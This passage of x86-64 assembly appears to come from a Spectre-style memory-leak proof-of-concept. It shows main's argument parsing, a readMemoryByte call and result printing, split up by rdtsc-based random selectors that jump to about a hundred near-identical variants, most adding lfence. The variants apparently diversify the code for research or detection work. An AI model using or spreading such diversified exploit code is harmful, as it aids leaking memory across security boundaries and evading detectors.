	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 51
.Lmain_win5_var51:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 52
.Lmain_win5_var52:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 53
.Lmain_win5_var53:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 54
.Lmain_win5_var54:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 55
.Lmain_win5_var55:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 56
.Lmain_win5_var56:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 57
.Lmain_win5_var57:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 58
.Lmain_win5_var58:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 59
.Lmain_win5_var59:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 60
.Lmain_win5_var60:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 61
.Lmain_win5_var61:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 62
.Lmain_win5_var62:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 63
.Lmain_win5_var63:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 64
.Lmain_win5_var64:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 65
.Lmain_win5_var65:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 66
.Lmain_win5_var66:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 67
.Lmain_win5_var67:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 68
.Lmain_win5_var68:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 69
.Lmain_win5_var69:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 70
.Lmain_win5_var70:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 71
.Lmain_win5_var71:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 72
.Lmain_win5_var72:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 73
.Lmain_win5_var73:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 74
.Lmain_win5_var74:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 75
.Lmain_win5_var75:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 76
.Lmain_win5_var76:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 77
.Lmain_win5_var77:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 78
.Lmain_win5_var78:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 79
.Lmain_win5_var79:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 80
.Lmain_win5_var80:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 81
.Lmain_win5_var81:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 82
.Lmain_win5_var82:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 83
.Lmain_win5_var83:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 84
.Lmain_win5_var84:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 85
.Lmain_win5_var85:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 86
.Lmain_win5_var86:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 87
.Lmain_win5_var87:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 88
.Lmain_win5_var88:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 89
.Lmain_win5_var89:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 90
.Lmain_win5_var90:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 91
.Lmain_win5_var91:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 92
.Lmain_win5_var92:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 93
.Lmain_win5_var93:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 94
.Lmain_win5_var94:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 95
.Lmain_win5_var95:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 96
.Lmain_win5_var96:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 97
.Lmain_win5_var97:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 98
.Lmain_win5_var98:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 99
.Lmain_win5_var99:
	popq	%rax
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
.Lmain_win5_continue:
	addq	$32, %rsp
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movq	-32(%rbp), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -32(%rbp)
	movq	-64(%rbp), %rax
	addq	$24, %rax
	movq	(%rax), %rax
	leaq	-40(%rbp), %rdx
	leaq	.LC1(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
.L33:
	movl	-44(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC7(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC8(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC9(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$10, %edi
	call	putchar@PLT
	movl	-40(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC10(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L34
.L42:
	movq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC11(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-32(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -32(%rbp)
	movl	-44(%rbp), %edi
	leaq	-20(%rbp), %rcx
	leaq	-10(%rbp), %rdx
	movq	%rax, %rsi
	call	readMemoryByte
	movl	-20(%rbp), %eax
	movl	-16(%rbp), %edx
	addl	%edx, %edx
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win4_var0
	cmpl	$1, %eax
	je	.Lmain_win4_var1
	cmpl	$2, %eax
	je	.Lmain_win4_var2
	cmpl	$3, %eax
	je	.Lmain_win4_var3
	cmpl	$4, %eax
	je	.Lmain_win4_var4
	cmpl	$5, %eax
	je	.Lmain_win4_var5
	cmpl	$6, %eax
	je	.Lmain_win4_var6
	cmpl	$7, %eax
	je	.Lmain_win4_var7
	cmpl	$8, %eax
	je	.Lmain_win4_var8
	cmpl	$9, %eax
	je	.Lmain_win4_var9
	cmpl	$10, %eax
	je	.Lmain_win4_var10
	cmpl	$11, %eax
	je	.Lmain_win4_var11
	cmpl	$12, %eax
	je	.Lmain_win4_var12
	cmpl	$13, %eax
	je	.Lmain_win4_var13
	cmpl	$14, %eax
	je	.Lmain_win4_var14
	cmpl	$15, %eax
	je	.Lmain_win4_var15
	cmpl	$16, %eax
	je	.Lmain_win4_var16
	cmpl	$17, %eax
	je	.Lmain_win4_var17
	cmpl	$18, %eax
	je	.Lmain_win4_var18
	cmpl	$19, %eax
	je	.Lmain_win4_var19
	cmpl	$20, %eax
	je	.Lmain_win4_var20
	cmpl	$21, %eax
	je	.Lmain_win4_var21
	cmpl	$22, %eax
	je	.Lmain_win4_var22
	cmpl	$23, %eax
	je	.Lmain_win4_var23
	cmpl	$24, %eax
	je	.Lmain_win4_var24
	cmpl	$25, %eax
	je	.Lmain_win4_var25
	cmpl	$26, %eax
	je	.Lmain_win4_var26
	cmpl	$27, %eax
	je	.Lmain_win4_var27
	cmpl	$28, %eax
	je	.Lmain_win4_var28
	cmpl	$29, %eax
	je	.Lmain_win4_var29
	cmpl	$30, %eax
	je	.Lmain_win4_var30
	cmpl	$31, %eax
	je	.Lmain_win4_var31
	cmpl	$32, %eax
	je	.Lmain_win4_var32
	cmpl	$33, %eax
	je	.Lmain_win4_var33
	cmpl	$34, %eax
	je	.Lmain_win4_var34
	cmpl	$35, %eax
	je	.Lmain_win4_var35
	cmpl	$36, %eax
	je	.Lmain_win4_var36
	cmpl	$37, %eax
	je	.Lmain_win4_var37
	cmpl	$38, %eax
	je	.Lmain_win4_var38
	cmpl	$39, %eax
	je	.Lmain_win4_var39
	cmpl	$40, %eax
	je	.Lmain_win4_var40
	cmpl	$41, %eax
	je	.Lmain_win4_var41
	cmpl	$42, %eax
	je	.Lmain_win4_var42
	cmpl	$43, %eax
	je	.Lmain_win4_var43
	cmpl	$44, %eax
	je	.Lmain_win4_var44
	cmpl	$45, %eax
	je	.Lmain_win4_var45
	cmpl	$46, %eax
	je	.Lmain_win4_var46
	cmpl	$47, %eax
	je	.Lmain_win4_var47
	cmpl	$48, %eax
	je	.Lmain_win4_var48
	cmpl	$49, %eax
	je	.Lmain_win4_var49
	cmpl	$50, %eax
	je	.Lmain_win4_var50
	cmpl	$51, %eax
	je	.Lmain_win4_var51
	cmpl	$52, %eax
	je	.Lmain_win4_var52
	cmpl	$53, %eax
	je	.Lmain_win4_var53
	cmpl	$54, %eax
	je	.Lmain_win4_var54
	cmpl	$55, %eax
	je	.Lmain_win4_var55
	cmpl	$56, %eax
	je	.Lmain_win4_var56
	cmpl	$57, %eax
	je	.Lmain_win4_var57
	cmpl	$58, %eax
	je	.Lmain_win4_var58
	cmpl	$59, %eax
	je	.Lmain_win4_var59
	cmpl	$60, %eax
	je	.Lmain_win4_var60
	cmpl	$61, %eax
	je	.Lmain_win4_var61
	cmpl	$62, %eax
	je	.Lmain_win4_var62
	cmpl	$63, %eax
	je	.Lmain_win4_var63
	cmpl	$64, %eax
	je	.Lmain_win4_var64
	cmpl	$65, %eax
	je	.Lmain_win4_var65
	cmpl	$66, %eax
	je	.Lmain_win4_var66
	cmpl	$67, %eax
	je	.Lmain_win4_var67
	cmpl	$68, %eax
	je	.Lmain_win4_var68
	cmpl	$69, %eax
	je	.Lmain_win4_var69
	cmpl	$70, %eax
	je	.Lmain_win4_var70
	cmpl	$71, %eax
	je	.Lmain_win4_var71
	cmpl	$72, %eax
	je	.Lmain_win4_var72
	cmpl	$73, %eax
	je	.Lmain_win4_var73
	cmpl	$74, %eax
	je	.Lmain_win4_var74
	cmpl	$75, %eax
	je	.Lmain_win4_var75
	cmpl	$76, %eax
	je	.Lmain_win4_var76
	cmpl	$77, %eax
	je	.Lmain_win4_var77
	cmpl	$78, %eax
	je	.Lmain_win4_var78
	cmpl	$79, %eax
	je	.Lmain_win4_var79
	cmpl	$80, %eax
	je	.Lmain_win4_var80
	cmpl	$81, %eax
	je	.Lmain_win4_var81
	cmpl	$82, %eax
	je	.Lmain_win4_var82
	cmpl	$83, %eax
	je	.Lmain_win4_var83
	cmpl	$84, %eax
	je	.Lmain_win4_var84
	cmpl	$85, %eax
	je	.Lmain_win4_var85
	cmpl	$86, %eax
	je	.Lmain_win4_var86
	cmpl	$87, %eax
	je	.Lmain_win4_var87
	cmpl	$88, %eax
	je	.Lmain_win4_var88
	cmpl	$89, %eax
	je	.Lmain_win4_var89
	cmpl	$90, %eax
	je	.Lmain_win4_var90
	cmpl	$91, %eax
	je	.Lmain_win4_var91
	cmpl	$92, %eax
	je	.Lmain_win4_var92
	cmpl	$93, %eax
	je	.Lmain_win4_var93
	cmpl	$94, %eax
	je	.Lmain_win4_var94
	cmpl	$95, %eax
	je	.Lmain_win4_var95
	cmpl	$96, %eax
	je	.Lmain_win4_var96
	cmpl	$97, %eax
	je	.Lmain_win4_var97
	cmpl	$98, %eax
	je	.Lmain_win4_var98
	cmpl	$99, %eax
	je	.Lmain_win4_var99
	jmp	.Lmain_win4_var0
## Variant 0
.Lmain_win4_var0:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 1
.Lmain_win4_var1:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 2
.Lmain_win4_var2:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 3
.Lmain_win4_var3:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 4
.Lmain_win4_var4:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 5
.Lmain_win4_var5:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 6
.Lmain_win4_var6:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 7
.Lmain_win4_var7:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 8
.Lmain_win4_var8:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 9
.Lmain_win4_var9:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 10
.Lmain_win4_var10:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 11
.Lmain_win4_var11:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 12
.Lmain_win4_var12:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 13
.Lmain_win4_var13:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 14
.Lmain_win4_var14:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 15
.Lmain_win4_var15:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 16
.Lmain_win4_var16:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 17
.Lmain_win4_var17:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 18
.Lmain_win4_var18:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 19
.Lmain_win4_var19:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 20
.Lmain_win4_var20:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 21
.Lmain_win4_var21:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 22
.Lmain_win4_var22:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 23
.Lmain_win4_var23:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 24
.Lmain_win4_var24:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 25
.Lmain_win4_var25:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 26
.Lmain_win4_var26:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 27
.Lmain_win4_var27:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 28
.Lmain_win4_var28:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 29
.Lmain_win4_var29:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 30
.Lmain_win4_var30:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 31
.Lmain_win4_var31:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 32
.Lmain_win4_var32:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 33
.Lmain_win4_var33:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 34
.Lmain_win4_var34:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 35
.Lmain_win4_var35:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
